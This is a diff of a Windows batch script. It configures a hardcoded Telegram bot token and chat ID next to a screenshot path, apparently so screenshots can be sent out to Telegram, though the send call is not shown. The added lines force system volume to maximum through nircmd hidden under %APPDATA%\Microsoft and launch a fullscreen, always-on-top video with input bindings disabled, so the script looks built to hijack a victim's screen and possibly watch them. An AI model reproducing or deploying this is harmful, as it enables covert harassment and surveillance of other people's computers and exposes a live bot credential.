@@ -3,7 +3,7 @@
 
 :: Set your bot token and chat ID
 set "TOKEN=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
-set "CHAT_ID=-1002460905948"
+set "CHAT_ID=-4765575800"
 :: Path to your photo
 set "PHOTO_PATH=%USERPROFILE%\Downloads\screenshot.png"
 
@@ -48,10 +48,9 @@ goto loop
 :play
 
 cd /d "%USERPROFILE%\Desktop\test\Atest"
-
+"%APPDATA%\Microsoft\nircmd.exe" setsysvolume 20238
 start "" /B mpv.exe --fullscreen --border=no --ontop --no-input-default-bindings --no-osc --no-stop-screensaver --term-status-msg=" " --idle=no --force-window=no --no-terminal --geometry=100%x100% --keepaspect=no --autofit=100%x100% --length=7 video.mp4
-timeout /t 4 /nobreak >nul
-taskkill /im mpv.exe /f
+timeout /t 3 /nobreak >nul
 echo 1 > "%temp%\run_once1.flag"
 
 
